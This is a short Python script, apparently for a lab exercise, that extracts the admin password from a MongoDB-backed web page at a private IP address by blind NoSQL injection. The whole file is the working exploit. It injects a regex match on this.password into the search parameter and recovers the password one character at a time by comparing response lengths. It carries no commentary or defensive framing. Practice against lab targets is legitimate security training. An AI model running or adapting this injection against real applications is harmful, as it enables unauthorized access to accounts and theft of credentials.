import requests
import sys
def go():
	ori = '0123456789abcdefghijklmnopqrstuvwxyz_ABCDEFGHIJKLMNOPQRSTUVWXYZ';
	url = 'http://192.168.32.144/mongodb/example2/?search=admin%27%20%26%26%20this.password.match(/';
	
	password = '';
	flag = 0 ;

	while True:
		flag = 0;
		for i in ori:
			#print i;
			finalurl = url + '^' + password + i + '/) // %00';
			#print 'finalurl:' + finalurl;
			r = requests.get(finalurl);
			
			#print 'r.text:' + r.text;
			#print 'r.length:' + str(len(r.text));
			
			if len(r.text) != 1528 :
				r.close();
				flag = 1;
				password += i ;
				print password;
				break;
			r.close();
		if flag != 1:
			break;

if __name__ == '__main__':
	go();	
